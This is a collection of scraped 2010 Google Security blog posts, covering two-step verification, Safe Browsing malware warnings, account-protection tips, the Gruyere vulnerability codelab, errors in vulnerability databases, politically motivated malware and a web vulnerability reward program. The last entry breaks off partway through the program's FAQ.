{"website": "Google-Security", "title": "\nMoving security beyond passwords\n", "author": ["Posted by Travis McCoy, Product Manager, Google Security Team"], "link": "https://security.googleblog.com/2010/09/moving-security-beyond-passwords.html", "abstract": "                              Posted by Travis McCoy, Product Manager, Google Security Team   Entering your username and password on a standard website gives you access to everything from your email and bank accounts to your favorite social networking site. Your passwords possess a lot of power, so it's critical to keep them from falling into the wrong hands. Unfortunately, we often find that passwords are the weakest link in the security chain. Keeping track of many passwords is a pain, and unfortunately accounts are regularly compromised when passwords are too weak, are reused across websites, or when people are tricked into sharing their password with someone untrustworthy. These are difficult industry problems to solve, and when re-thinking the traditional username/password design, we wanted to do more.  As we explained today on our  Google Enterprise Blog , we've developed an option to add two-step verification to Google Apps accounts. When signing in, Google will send a verification code to your phone, or let you generate one yourself using an application on your Android, BlackBerry or iPhone device. Entering this code, in addition to a normal password, gives us a strong indication that the person signing in is actually you. This new feature significantly improves the security of your Google Account, as it requires not only something you know: your username and password, but also something that only you should have: your phone. Even if someone has stolen your password, they'll need more than that to access your account.           Building the technology and infrastructure to support this kind of feature has taken careful thought. We wanted to develop a security feature that would be easy to use and not get in your way. Along those lines, we're offering a variety of sign in options, along with the ability to indicate when you're using a computer you trust and don't want to be asked for a verification code from that machine in the future. Making this service available to millions of users at no cost took a great deal of coordination across Google&#8217;s specialized infrastructure, from building a scalable SMS and voice call system to developing open source mobile applications for your smart phone. The result is a feature we hope you'll find simple to manage and that makes it easy to better protect your account.  We look forward to gathering feedback about this feature and making it available to all of our users in the coming months.  If you'd like to learn more about about staying safe online, see our ongoing security  blog series  or visit  http://www.staysafeonline.org/ .                                   Posted by Travis McCoy, Product Manager, Google Security TeamEntering your username and password on a standard website gives you access to everything from your email and bank accounts to your favorite social networking site. Your passwords possess a lot of power, so it's critical to keep them from falling into the wrong hands. Unfortunately, we often find that passwords are the weakest link in the security chain. Keeping track of many passwords is a pain, and unfortunately accounts are regularly compromised when passwords are too weak, are reused across websites, or when people are tricked into sharing their password with someone untrustworthy. These are difficult industry problems to solve, and when re-thinking the traditional username/password design, we wanted to do more.As we explained today on our Google Enterprise Blog, we've developed an option to add two-step verification to Google Apps accounts. When signing in, Google will send a verification code to your phone, or let you generate one yourself using an application on your Android, BlackBerry or iPhone device. Entering this code, in addition to a normal password, gives us a strong indication that the person signing in is actually you. This new feature significantly improves the security of your Google Account, as it requires not only something you know: your username and password, but also something that only you should have: your phone. Even if someone has stolen your password, they'll need more than that to access your account.Building the technology and infrastructure to support this kind of feature has taken careful thought. We wanted to develop a security feature that would be easy to use and not get in your way. Along those lines, we're offering a variety of sign in options, along with the ability to indicate when you're using a computer you trust and don't want to be asked for a verification code from that machine in the future. Making this service available to millions of users at no cost took a great deal of coordination across Google’s specialized infrastructure, from building a scalable SMS and voice call system to developing open source mobile applications for your smart phone. The result is a feature we hope you'll find simple to manage and that makes it easy to better protect your account.We look forward to gathering feedback about this feature and making it available to all of our users in the coming months.If you'd like to learn more about about staying safe online, see our ongoing security blog series or visit http://www.staysafeonline.org/.     ", "date": "September 20, 2010"},
{"website": "Google-Security", "title": "\nStay safe while browsing\n", "author": ["Posted by Panayiotis Mavrommatis and Niels Provos, Security Team"], "link": "https://security.googleblog.com/2010/09/stay-safe-while-browsing.html", "abstract": "                             Posted by Panayiotis Mavrommatis and Niels Provos, Security Team        We are constantly working on detecting sites that are compromised or are deliberately set up to infect your machine while browsing the web. We provide warnings on our search results and to browsers such as Firefox and Chrome. A lot of the warnings take people by surprise &#8212; they can trigger on your favorite news site, a blog you read daily, or another site you would never consider to be involved in malicious activities.     In fact, it&#8217;s very important to heed these warnings because they show up for sites that are under attack. We are very confident with the results of our scanners that create these warnings, and we work with webmasters to show where attack code was injected. As soon as we think the site has been cleaned up, we lift the warning.    This week in particular, a lot of web users have become vulnerable. A number of live public exploits were attacking the latest versions of some very popular browser plug-ins. Our automated detection systems encounter these attacks every day, e.g. exploits against PDF (CVE-2010-2883), Quicktime (CVE-2010-1818) and Flash (CVE-2010-2884).    We found it interesting that we discovered the PDF exploit on the same page as a more &#8220;traditional&#8221; fake anti-virus page, in which users are prompted to install an executable file. So, even if you run into a fake anti-virus page and ignore it, we suggest you run a thorough anti-virus scan on your machine.    We and others have observed that once a vulnerability has been exploited and announced, it does not take long for it to be abused widely on the web. For example, the stack overflow vulnerability in PDF was announced on September 7th, 2010, and the Metasploit project made an exploit module available only one day later. Our systems found the vulnerability abused across multiple exploit sites on September 13th.    Here&#8217;s a few suggestions for protecting yourself against web attacks:  Keep your OS, browser, and browser plugins up-to-date.   Run anti-virus software, and keep this up-to-date, too.   Disable or uninstall any software or browser plug-ins you don&#8217;t use &#8212; this reduces your vulnerability surface.   If you receive a PDF attachment in Gmail, select &#8220;View&#8221; to view it in Gmail instead of downloading it.                                       Posted by Panayiotis Mavrommatis and Niels Provos, Security Team  We are constantly working on detecting sites that are compromised or are deliberately set up to infect your machine while browsing the web. We provide warnings on our search results and to browsers such as Firefox and Chrome. A lot of the warnings take people by surprise — they can trigger on your favorite news site, a blog you read daily, or another site you would never consider to be involved in malicious activities.   In fact, it’s very important to heed these warnings because they show up for sites that are under attack. We are very confident with the results of our scanners that create these warnings, and we work with webmasters to show where attack code was injected. As soon as we think the site has been cleaned up, we lift the warning.  This week in particular, a lot of web users have become vulnerable. A number of live public exploits were attacking the latest versions of some very popular browser plug-ins. Our automated detection systems encounter these attacks every day, e.g. exploits against PDF (CVE-2010-2883), Quicktime (CVE-2010-1818) and Flash (CVE-2010-2884).  We found it interesting that we discovered the PDF exploit on the same page as a more “traditional” fake anti-virus page, in which users are prompted to install an executable file. So, even if you run into a fake anti-virus page and ignore it, we suggest you run a thorough anti-virus scan on your machine.  We and others have observed that once a vulnerability has been exploited and announced, it does not take long for it to be abused widely on the web. For example, the stack overflow vulnerability in PDF was announced on September 7th, 2010, and the Metasploit project made an exploit module available only one day later. Our systems found the vulnerability abused across multiple exploit sites on September 13th.  Here’s a few suggestions for protecting yourself against web attacks:Keep your OS, browser, and browser plugins up-to-date. Run anti-virus software, and keep this up-to-date, too. Disable or uninstall any software or browser plug-ins you don’t use — this reduces your vulnerability surface. If you receive a PDF attachment in Gmail, select “View” to view it in Gmail instead of downloading it.      ", "date": "September 16, 2010"},
{"website": "Google-Security", "title": "\nPhishing URLs and XML Notifications\n", "author": ["Posted by Nav Jagpal, Security team"], "link": "https://security.googleblog.com/2010/10/phishing-urls-and-xml-notifications.html", "abstract": "                             Posted by Nav Jagpal, Security team     Recently, we announced  Safe Browsing Alerts for Network Administrators . Today we&#8217;re adding phishing URLs to the notification messages. This means that in addition to being alerted to compromised URLs found on networks, you&#8217;ll be alerted to phishing URLs as well.    We&#8217;d also like to point out the XML notification feature. By default, we send notification messages in a simple email message. However, we realize that some of you may want to process these notifications by a script, so we&#8217;ve added the ability to receive messages in XML format. Click on an AS in your list to modify preferences, such as enabling the XML notification feature. If you decide to use XML email messages, you should familiarize yourself with the  XML Schema .    If you&#8217;re a network administrator and haven&#8217;t yet registered your AS, you can do so  here .                                   Posted by Nav Jagpal, Security team  Recently, we announced Safe Browsing Alerts for Network Administrators. Today we’re adding phishing URLs to the notification messages. This means that in addition to being alerted to compromised URLs found on networks, you’ll be alerted to phishing URLs as well.  We’d also like to point out the XML notification feature. By default, we send notification messages in a simple email message. However, we realize that some of you may want to process these notifications by a script, so we’ve added the ability to receive messages in XML format. Click on an AS in your list to modify preferences, such as enabling the XML notification feature. If you decide to use XML email messages, you should familiarize yourself with the XML Schema.  If you’re a network administrator and haven’t yet registered your AS, you can do so here.     ", "date": "October 14, 2010"},
{"website": "Google-Security", "title": "\nProtecting your data in the cloud\n", "author": ["Posted by Priya Nayak, Consumer Operations, Google Accounts"], "link": "https://security.googleblog.com/2010/10/protecting-your-data-in-cloud.html", "abstract": "                             Posted by Priya Nayak, Consumer Operations, Google Accounts   Like many people, you probably store a lot of important information in your Google Account. I personally check my Gmail account every day (sometimes several times a day) and rely on having access to my mail and contacts wherever I go. Aside from Gmail, my Google Account is tied to lots of other services that help me manage my life and interests: photos, documents, blogs, calendars, and more. That is to say, my Google Account is very valuable to me.  Unfortunately, a Google Account is also valuable in the eyes of spammers and other people looking to do harm. It&#8217;s not so much about your specific account, but rather the fact that your friends and family see your Google Account as trustworthy. A perfect example is the  &#8220;Mugged in London&#8221; phishing scam  that aims to trick your contacts into wiring money &#8212; ostensibly to help you out. If your account is compromised and used to send these messages, your well-meaning friends may find themselves out a chunk of change. If you have sensitive information in your account, it may also be at risk of improper access.  As part of  National Cyber Security Awareness month , we want to let you know what you can do to better protect your Google Account.   Stay one step ahead of the bad guys   Account hijackers prey on the bad habits of the average Internet user. Understanding common hijacking techniques and using better security practices will help you stay one step ahead of them.  The most common ways hijackers can get access to your Google password are:    Password re-use : You sign up for an account on a third-party site with your Google username and password. If that site is hacked and your sign-in information is discovered, the hijacker has easy access to your Google Account.   Malware : You use a computer with infected software that is designed to steal your passwords as you type (&#8220;keylogging&#8221;) or grab them from your browser&#8217;s cache data.   Phishing : You respond to a website, email, or phone call that claims to come from a legitimate organization and asks for your username and password.   Brute force : You use a password that&#8217;s easy to guess, like your first or last name plus your birth date (&#8220;Laura1968&#8221;), or you provide an answer to a secret question that&#8217;s common and therefore easy to guess, like &#8220;pizza&#8221; for &#8220;What is your favorite food?&#8221;  As you can see, hijackers have many tactics for stealing your password, and it&#8217;s important to be aware of all of them.   Take control of your account security across the web    Online accounts that share passwords are like a line of dominoes: When one falls, it doesn&#8217;t take much for the others to fall, too. This is why you should choose unique passwords for important accounts like Gmail (your Google Account), your bank, commerce sites, and social networking sites. We&#8217;re also  working on technology  that adds another layer of protection beyond your password to make your Google Account significantly more secure.  Choosing a unique password is not enough to secure your Google Account against every possible threat. That&#8217;s why we&#8217;ve created an easy-to-use  checklist  to help you secure your computer, browser, Gmail, and Google Account. We encourage you to go through the entire checklist, but want to highlight these tips:    Never re-use passwords  for your important accounts like online banking, email, social networking, and commerce.   Change your password periodically , and be sure to do so for important accounts whenever you suspect one of them may have been at risk. Don&#8217;t just change your password by a few letters or numbers (&#8220;Aquarius5&#8221; to &#8220;Aquarius6&#8221;); change the combination of letters and numbers to something unique each time.   Never respond to messages, non-Google websites, or phone calls  asking for your Google username or password; a legitimate organization will not ask you for this type of information.  Report these messages  to us so we can take action. If you responded and can no longer access your account,  visit our account recovery page .  We hope you&#8217;ll take action to ensure your security across the web, not just on Google. Run regular virus scans, don&#8217;t re-use your passwords, and keep your software and  account recovery information  up to date. These simple yet powerful steps can make a difference when it really counts.                                    Posted by Priya Nayak, Consumer Operations, Google AccountsLike many people, you probably store a lot of important information in your Google Account. I personally check my Gmail account every day (sometimes several times a day) and rely on having access to my mail and contacts wherever I go. Aside from Gmail, my Google Account is tied to lots of other services that help me manage my life and interests: photos, documents, blogs, calendars, and more. That is to say, my Google Account is very valuable to me.Unfortunately, a Google Account is also valuable in the eyes of spammers and other people looking to do harm. It’s not so much about your specific account, but rather the fact that your friends and family see your Google Account as trustworthy. A perfect example is the “Mugged in London” phishing scam that aims to trick your contacts into wiring money — ostensibly to help you out. If your account is compromised and used to send these messages, your well-meaning friends may find themselves out a chunk of change. If you have sensitive information in your account, it may also be at risk of improper access.As part of National Cyber Security Awareness month, we want to let you know what you can do to better protect your Google Account.Stay one step ahead of the bad guysAccount hijackers prey on the bad habits of the average Internet user. Understanding common hijacking techniques and using better security practices will help you stay one step ahead of them.The most common ways hijackers can get access to your Google password are:Password re-use: You sign up for an account on a third-party site with your Google username and password. If that site is hacked and your sign-in information is discovered, the hijacker has easy access to your Google Account.Malware: You use a computer with infected software that is designed to steal your passwords as you type (“keylogging”) or grab them from your browser’s cache data.Phishing: You respond to a website, email, or phone call that claims to come from a legitimate organization and asks for your username and password.Brute force: You use a password that’s easy to guess, like your first or last name plus your birth date (“Laura1968”), or you provide an answer to a secret question that’s common and therefore easy to guess, like “pizza” for “What is your favorite food?”As you can see, hijackers have many tactics for stealing your password, and it’s important to be aware of all of them.Take control of your account security across the web Online accounts that share passwords are like a line of dominoes: When one falls, it doesn’t take much for the others to fall, too. This is why you should choose unique passwords for important accounts like Gmail (your Google Account), your bank, commerce sites, and social networking sites. We’re also working on technology that adds another layer of protection beyond your password to make your Google Account significantly more secure.Choosing a unique password is not enough to secure your Google Account against every possible threat. That’s why we’ve created an easy-to-use checklist to help you secure your computer, browser, Gmail, and Google Account. We encourage you to go through the entire checklist, but want to highlight these tips:Never re-use passwords for your important accounts like online banking, email, social networking, and commerce.Change your password periodically, and be sure to do so for important accounts whenever you suspect one of them may have been at risk. Don’t just change your password by a few letters or numbers (“Aquarius5” to “Aquarius6”); change the combination of letters and numbers to something unique each time.Never respond to messages, non-Google websites, or phone calls asking for your Google username or password; a legitimate organization will not ask you for this type of information. Report these messages to us so we can take action. If you responded and can no longer access your account, visit our account recovery page.We hope you’ll take action to ensure your security across the web, not just on Google. Run regular virus scans, don’t re-use your passwords, and keep your software and account recovery information up to date. These simple yet powerful steps can make a difference when it really counts.     ", "date": "October 15, 2010"},
{"website": "Google-Security", "title": "\nSafe Browsing Alerts for Network Administrators\n", "author": ["Posted by Nav Jagpal and Ke Wang, Security Team"], "link": "https://security.googleblog.com/2010/09/safe-browsing-alerts-for-network.html", "abstract": "                             Posted by Nav Jagpal and Ke Wang, Security Team     Google has been working hard to protect its users from malicious web pages, and also to help webmasters keep their websites clean. When we find malicious content on websites, we  attempt to notify  their webmasters via email about the bad URLs. There is even a  Webmaster Tools feature  that helps webmasters identify specific malicious content that has been surreptitiously added to their sites, so that they can clean up their site and help prevent it from being compromised in the future.     Today, we&#8217;re happy to announce  Google Safe Browsing Alerts for Network Administrators  -- an experimental tool which allows  Autonomous System  (AS) owners to receive early notifications for malicious content found on their networks. A single network or ISP can host hundreds or thousands of different websites. Although network administrators may not be responsible for running the websites themselves, they have an interest in the quality of the content being hosted on their networks. We&#8217;re hoping that with this additional level of information, administrators can help make the Internet safer by working with webmasters to remove malicious content and fix security vulnerabilities.    To get started, visit  safebrowsingalerts.googlelabs.com .                                   Posted by Nav Jagpal and Ke Wang, Security Team  Google has been working hard to protect its users from malicious web pages, and also to help webmasters keep their websites clean. When we find malicious content on websites, we attempt to notify their webmasters via email about the bad URLs. There is even a Webmaster Tools feature that helps webmasters identify specific malicious content that has been surreptitiously added to their sites, so that they can clean up their site and help prevent it from being compromised in the future.   Today, we’re happy to announce Google Safe Browsing Alerts for Network Administrators -- an experimental tool which allows Autonomous System (AS) owners to receive early notifications for malicious content found on their networks. A single network or ISP can host hundreds or thousands of different websites. Although network administrators may not be responsible for running the websites themselves, they have an interest in the quality of the content being hosted on their networks. We’re hoping that with this additional level of information, administrators can help make the Internet safer by working with webmasters to remove malicious content and fix security vulnerabilities.  To get started, visit safebrowsingalerts.googlelabs.com.     ", "date": "September 28, 2010"},
{"website": "Google-Security", "title": "\nThis Internet is Your Internet: Digital Citizenship from California to Washtenaw County\n", "author": ["Posted by Adrienne St. Aubin, Public Policy Analyst"], "link": "https://security.googleblog.com/2010/10/this-internet-is-your-internet-digital.html", "abstract": "                             Posted by Adrienne St. Aubin, Public Policy Analyst   In the physical world, basic safety measures are second-nature to almost everyone (look both ways, stop drop and roll!). In the digital world, however, many of us expect security to be handled on our behalf by experts, or come in a single-box solution. Together, we must reset those expectations.  The Internet is the biggest neighborhood in the world. Security-related initiatives in the technology sector and government play an important role in making the Internet safer, but efforts from Silicon Valley and Washington, D.C. alone are not enough. Much of the important work that needs to be done must happen closer to home&#8212;wherever that may be.  As part of  National Cyber Security Awareness Month  I recently traveled from California to Washtenaw County, MI to speak to group of local community leaders, educators, business owners, law enforcement officials and residents who recently formed the  Washtenaw Cyber Citizenship Coalition . They are working to create a digitally aware, knowledgeable and more secure community by providing residents with the tools and resources to be good digital citizens. No one in the room self-identified as a &#8220;cyber security expert,&#8221; but the information sharing that&#8217;s happening in Washtenaw County is the kind of holistic effort that can enable everyone to use the Internet more safely and benefit from the great opportunities that it provides.  The Washtenaw Cyber Citizenship Coalition is channeling the community&#8217;s efforts through volunteer workgroups in areas such as public/private partnerships, awareness, education and law enforcement. Their strategy is to &#8220;share the wheel\" whenever possible, instead of recreating it. They&#8217;ve collected tips and resources for kids, parents, businesses, educators and crime victims so that citizens can find and access these materials with ease.  If you are interested in raising awareness in your own community,  staysafeonline.org ,  stopthinkconnect.org  and  onguardonline.gov  are examples of sites that offer such materials for public use.                                   Posted by Adrienne St. Aubin, Public Policy AnalystIn the physical world, basic safety measures are second-nature to almost everyone (look both ways, stop drop and roll!). In the digital world, however, many of us expect security to be handled on our behalf by experts, or come in a single-box solution. Together, we must reset those expectations.The Internet is the biggest neighborhood in the world. Security-related initiatives in the technology sector and government play an important role in making the Internet safer, but efforts from Silicon Valley and Washington, D.C. alone are not enough. Much of the important work that needs to be done must happen closer to home—wherever that may be.As part of National Cyber Security Awareness Month I recently traveled from California to Washtenaw County, MI to speak to group of local community leaders, educators, business owners, law enforcement officials and residents who recently formed the Washtenaw Cyber Citizenship Coalition. They are working to create a digitally aware, knowledgeable and more secure community by providing residents with the tools and resources to be good digital citizens. No one in the room self-identified as a “cyber security expert,” but the information sharing that’s happening in Washtenaw County is the kind of holistic effort that can enable everyone to use the Internet more safely and benefit from the great opportunities that it provides.The Washtenaw Cyber Citizenship Coalition is channeling the community’s efforts through volunteer workgroups in areas such as public/private partnerships, awareness, education and law enforcement. Their strategy is to “share the wheel\" whenever possible, instead of recreating it. They’ve collected tips and resources for kids, parents, businesses, educators and crime victims so that citizens can find and access these materials with ease.If you are interested in raising awareness in your own community, staysafeonline.org, stopthinkconnect.org and onguardonline.gov are examples of sites that offer such materials for public use.     ", "date": "October 21, 2010"},
{"website": "Google-Security", "title": "\nDo Know Evil: web application vulnerabilities\n", "author": ["Posted by Bruce Leban, Software Engineer"], "link": "https://security.googleblog.com/2010/05/do-know-evil-web-application.html", "abstract": "                             Posted by Bruce Leban, Software Engineer    UPDATE July 13: We have changed the name of the codelab application to Gruyere. The codelab is now located at  http://google-gruyere.appspot.com .   We want Google employees to have a firm understanding of the threats our services face, as well as how to help protect against those threats. We work toward these goals in a variety of ways, including security training for new engineers, technical presentations about security, and other types of documentation. We also use codelabs &#8212; interactive programming tutorials that walk participants through specific programming tasks.  One codelab in particular teaches developers about common types of web application vulnerabilities. In the spirit of the thinking that \"it takes a hacker to catch a hacker,\" the codelab also demonstrates how an attacker could exploit such vulnerabilities.  We're releasing this codelab, entitled \"Web Application Exploits and Defenses,\" today in coordination with  Google Code University  and  Google Labs  to help software developers better recognize, fix, and avoid similar flaws in their own applications. The codelab is built around Gruyere, a small yet full-featured microblogging application designed to contain lots of security bugs. The vulnerabilities covered by the lab include cross-site scripting (XSS), cross-site request forgery (XSRF) and cross-site script inclusion (XSSI), as well as client-state manipulation, path traversal and AJAX and configuration vulnerabilities. It also shows how simple bugs can lead to information disclosure, denial-of-service and remote code execution.  The maxim, \"given enough eyeballs, all bugs are shallow\" is only true if the eyeballs know what to look for. To that end, the security bugs in Gruyere are real bugs &#8212; just like those in many other applications. The Gruyere source code is published under a Creative Commons license and is available for use in whitebox hacking exercises or in computer science classes covering security, software engineering or general software development.  To get started, visit  http://google-gruyere.appspot.com . An instructor's guide for using the codelab is now available on  Google Code University .                                   Posted by Bruce Leban, Software EngineerUPDATE July 13: We have changed the name of the codelab application to Gruyere. The codelab is now located at http://google-gruyere.appspot.com.We want Google employees to have a firm understanding of the threats our services face, as well as how to help protect against those threats. We work toward these goals in a variety of ways, including security training for new engineers, technical presentations about security, and other types of documentation. We also use codelabs — interactive programming tutorials that walk participants through specific programming tasks.One codelab in particular teaches developers about common types of web application vulnerabilities. In the spirit of the thinking that \"it takes a hacker to catch a hacker,\" the codelab also demonstrates how an attacker could exploit such vulnerabilities.We're releasing this codelab, entitled \"Web Application Exploits and Defenses,\" today in coordination with Google Code University and Google Labs to help software developers better recognize, fix, and avoid similar flaws in their own applications. The codelab is built around Gruyere, a small yet full-featured microblogging application designed to contain lots of security bugs. The vulnerabilities covered by the lab include cross-site scripting (XSS), cross-site request forgery (XSRF) and cross-site script inclusion (XSSI), as well as client-state manipulation, path traversal and AJAX and configuration vulnerabilities. It also shows how simple bugs can lead to information disclosure, denial-of-service and remote code execution.The maxim, \"given enough eyeballs, all bugs are shallow\" is only true if the eyeballs know what to look for. To that end, the security bugs in Gruyere are real bugs — just like those in many other applications. The Gruyere source code is published under a Creative Commons license and is available for use in whitebox hacking exercises or in computer science classes covering security, software engineering or general software development.To get started, visit http://google-gruyere.appspot.com. An instructor's guide for using the codelab is now available on Google Code University.     ", "date": "May 4, 2010"},
{"website": "Google-Security", "title": "\nVulnerability trends: how are companies really doing?\n", "author": ["Posted by Adam Mein, Google Security Team"], "link": "https://security.googleblog.com/2010/08/vulnerability-trends-how-are-companies.html", "abstract": "                             Posted by Adam Mein, Google Security Team   Quite a few security companies and organizations produce vulnerability databases, cataloguing bugs and reporting trends across the industry based on the data they compile. There is value in this exercise; specifically, getting a look at examples across a range of companies and industries gives us information about the most common types of threats, as well as how they are distributed.  Unfortunately, the data behind these reports is commonly inaccurate or outdated to some degree. The truth is that maintaining an accurate and reliable database of this type of information is a significant challenge. We most recently saw this reality play out last week after the appearance of the IBM X-Force&#174; 2010 Mid-Year Trend and Risk Report. We questioned a number of surprising findings concerning Google&#8217;s vulnerability rate and response record, and after discussions with IBM, we discovered a number of errors that had important implications for the report&#8217;s conclusions. IBM worked together with us and promptly  issued a correction  to address the inaccuracies.  Google maintains a Product Security Response Team that prioritizes bug reports and coordinates their handling across relevant engineering groups. Unsurprisingly, particular attention is paid to high-risk and critical vulnerabilities. For this reason, we were confused by a claim that 33% of critical and high-risk bugs uncovered in our services in the first half of 2010 were left unpatched. We learned after investigating that the 33% figure referred to a single unpatched vulnerability out of a total of three &#8212; and importantly, the one item that was considered unpatched was only mistakenly considered a security vulnerability due to a  terminology mix-up . As a result, the true unpatched rate for these high-risk bugs is 0 out of 2, or 0%.  How do these types of errors occur? Maintainers of vulnerability databases have a number of factors working against them:   Vendors disclose their vulnerabilities in inconsistent formats, using different severity classifications. This makes the process of measuring the number of total vulnerabilities assigned to a given vendor much more difficult.  Assessing the severity, scope, and nature of a bug sometimes requires intimate knowledge of a product or technology, and this can lead to errors and misinterpretation.  Keeping the fix status updated for thousands of entries is no small task, and we&#8217;ve consistently seen long-fixed errors marked as unfixed in a number of databases.  Not all compilers of vulnerability databases perform their own independent verification of bugs they find reported from other sources. As a result, errors in one source can be replicated to others.  To make these databases more useful for the industry and less likely to spread misinformation, we feel there must be more frequent collaboration between vendors and compilers. As a first step, database compilers should reach out to vendors they plan to cover in order to devise a sustainable solution for both parties that will allow for a more consistent flow of information. Another big improvement would be increased transparency on the part of the compilers &#8212; for example, the inclusion of more hard data, the methodology behind the data gathering, and caveat language acknowledging the limitations of the presented data. We hope to see these common research practices employed more broadly to increase the quality and usefulness of vulnerability trend reports.                                      Posted by Adam Mein, Google Security TeamQuite a few security companies and organizations produce vulnerability databases, cataloguing bugs and reporting trends across the industry based on the data they compile. There is value in this exercise; specifically, getting a look at examples across a range of companies and industries gives us information about the most common types of threats, as well as how they are distributed.Unfortunately, the data behind these reports is commonly inaccurate or outdated to some degree. The truth is that maintaining an accurate and reliable database of this type of information is a significant challenge. We most recently saw this reality play out last week after the appearance of the IBM X-Force® 2010 Mid-Year Trend and Risk Report. We questioned a number of surprising findings concerning Google’s vulnerability rate and response record, and after discussions with IBM, we discovered a number of errors that had important implications for the report’s conclusions. IBM worked together with us and promptly issued a correction to address the inaccuracies.Google maintains a Product Security Response Team that prioritizes bug reports and coordinates their handling across relevant engineering groups. Unsurprisingly, particular attention is paid to high-risk and critical vulnerabilities. For this reason, we were confused by a claim that 33% of critical and high-risk bugs uncovered in our services in the first half of 2010 were left unpatched. We learned after investigating that the 33% figure referred to a single unpatched vulnerability out of a total of three — and importantly, the one item that was considered unpatched was only mistakenly considered a security vulnerability due to a terminology mix-up. As a result, the true unpatched rate for these high-risk bugs is 0 out of 2, or 0%.How do these types of errors occur? Maintainers of vulnerability databases have a number of factors working against them:Vendors disclose their vulnerabilities in inconsistent formats, using different severity classifications. This makes the process of measuring the number of total vulnerabilities assigned to a given vendor much more difficult.Assessing the severity, scope, and nature of a bug sometimes requires intimate knowledge of a product or technology, and this can lead to errors and misinterpretation.Keeping the fix status updated for thousands of entries is no small task, and we’ve consistently seen long-fixed errors marked as unfixed in a number of databases.Not all compilers of vulnerability databases perform their own independent verification of bugs they find reported from other sources. As a result, errors in one source can be replicated to others.To make these databases more useful for the industry and less likely to spread misinformation, we feel there must be more frequent collaboration between vendors and compilers. As a first step, database compilers should reach out to vendors they plan to cover in order to devise a sustainable solution for both parties that will allow for a more consistent flow of information. Another big improvement would be increased transparency on the part of the compilers — for example, the inclusion of more hard data, the methodology behind the data gathering, and caveat language acknowledging the limitations of the presented data. We hope to see these common research practices employed more broadly to increase the quality and usefulness of vulnerability trend reports.     ", "date": "August 30, 2010"},
{"website": "Google-Security", "title": "\nThe chilling effects of malware\n", "author": ["Posted by Neel Mehta, Security Team"], "link": "https://security.googleblog.com/2010/03/chilling-effects-of-malware.html", "abstract": "                             Posted by Neel Mehta, Security Team   In January, we  discussed  a set of highly sophisticated cyber attacks that originated in China and targeted many corporations around the world. We believe that malware is a general threat to the Internet, but it is especially harmful when it is used to suppress opinions of dissent. In that case, the attacks involved surveillance of email accounts belonging to Chinese human rights activists. Perhaps unsurprisingly, these are not the only examples of malicious software being used for political ends. We have gathered information about a separate cyber threat that was less sophisticated but that nonetheless was employed against another community.  This particular malware broadly targeted Vietnamese computer users around the world. The malware infected the computers of potentially tens of thousands of users who downloaded Vietnamese keyboard language software and possibly other legitimate software that was altered to infect users. While the malware itself was not especially sophisticated, it has nonetheless been used for damaging purposes. These infected machines have been used both to spy on their owners as well as participate in distributed denial of service (DDoS) attacks against blogs containing messages of political dissent. Specifically, these attacks have tried to squelch opposition to bauxite mining efforts in Vietnam, an important and emotionally charged issue in the country.  Since some anti-virus vendors have already introduced signatures to help detect this specific malware, we recommend the following actions, particularly if you believe that you may have been exposed to the malware: run regular anti-virus as well as anti-spyware scans from trusted vendors, and be sure to install all web browser and operating system updates to ensure you&#8217;re using only the latest versions. New technology like our  suspicious account activity alerts  in Gmail should also help detect surveillance efforts. At a larger scale, we feel the international community needs to take cybersecurity seriously to help keep free opinion flowing.                                   Posted by Neel Mehta, Security TeamIn January, we discussed a set of highly sophisticated cyber attacks that originated in China and targeted many corporations around the world. We believe that malware is a general threat to the Internet, but it is especially harmful when it is used to suppress opinions of dissent. In that case, the attacks involved surveillance of email accounts belonging to Chinese human rights activists. Perhaps unsurprisingly, these are not the only examples of malicious software being used for political ends. We have gathered information about a separate cyber threat that was less sophisticated but that nonetheless was employed against another community.This particular malware broadly targeted Vietnamese computer users around the world. The malware infected the computers of potentially tens of thousands of users who downloaded Vietnamese keyboard language software and possibly other legitimate software that was altered to infect users. While the malware itself was not especially sophisticated, it has nonetheless been used for damaging purposes. These infected machines have been used both to spy on their owners as well as participate in distributed denial of service (DDoS) attacks against blogs containing messages of political dissent. Specifically, these attacks have tried to squelch opposition to bauxite mining efforts in Vietnam, an important and emotionally charged issue in the country.Since some anti-virus vendors have already introduced signatures to help detect this specific malware, we recommend the following actions, particularly if you believe that you may have been exposed to the malware: run regular anti-virus as well as anti-spyware scans from trusted vendors, and be sure to install all web browser and operating system updates to ensure you’re using only the latest versions. New technology like our suspicious account activity alerts in Gmail should also help detect surveillance efforts. At a larger scale, we feel the international community needs to take cybersecurity seriously to help keep free opinion flowing.     ", "date": "March 30, 2010"},
{"website": "Google-Security", "title": "\nRewarding web application security research\n", "author": ["Posted by Chris Evans, Neel Mehta, Adam Mein, Matt Moore, and Michal Zalewski; Google Security Team"], "link": "https://security.googleblog.com/2010/11/rewarding-web-application-security.html", "abstract": "                             Posted by Chris Evans, Neel Mehta, Adam Mein, Matt Moore, and Michal Zalewski; Google Security Team   Back in January of this year, the Chromium open source project  launched a well-received vulnerability reward program . In the months since launch, researchers reporting a wide range of great bugs have received rewards &#8212; a small summary of which can be found in the  Hall of Fame . We've seen a sustained increase in the number of high quality reports from researchers, and their combined efforts are contributing to a more secure Chromium browser for millions of users.  Today, we are announcing an experimental new vulnerability reward program that applies to Google web properties. We already enjoy working with an array of researchers to improve Google security, and some individuals who have provided high caliber reports are listed on  our credits page . As well as enabling us to thank regular contributors in a new way, we hope our new program will attract new researchers and the types of reports that help make our users safer.  In the spirit of the original Chromium blog post, we have some information about the new program in a question and answer format below:   Q) What applications are in scope?  A) Any Google web properties which display or manage highly sensitive authenticated user data or accounts may be in scope. Some examples could include:   *.google.com  *.youtube.com  *.blogger.com  *.orkut.com  For now, Google's client applications (e.g. Android, Picasa, Google Desktop, etc) are not in scope. We may expand the program in the future.    UPDATE: We also recommend reading our  additional thoughts  about these guidelines to help clarify what types of applications and bugs are eligible for this program.   Q) What classes of bug are in scope?   A) It's difficult to provide a definitive list of vulnerabilities that will be rewarded; however, any serious bug which directly affects the confidentiality or integrity of user data may be in scope. We anticipate most rewards will be in bug categories such as:   XSS  XSRF / CSRF  XSSI (cross-site script inclusion)  Bypassing authorization controls (e.g. User A can access User B's private data)  Server side code execution or command injection  Out of concern for the availability of our services to all users, we ask you to refrain from using automated testing tools.  These categories of bugs are definitively excluded:   attacks against Google&#8217;s corporate infrastructure  social engineering and physical attacks  denial of service bugs  non-web application vulnerabilities, including vulnerabilities in client applications  SEO blackhat techniques  vulnerabilities in Google-branded websites hosted by third parties  bugs in technologies recently acquired by Google   Q) How far should I go to demonstrate a vulnerability?  A) Please, only ever target your own account or a test account. Never attempt to access anyone else's data. 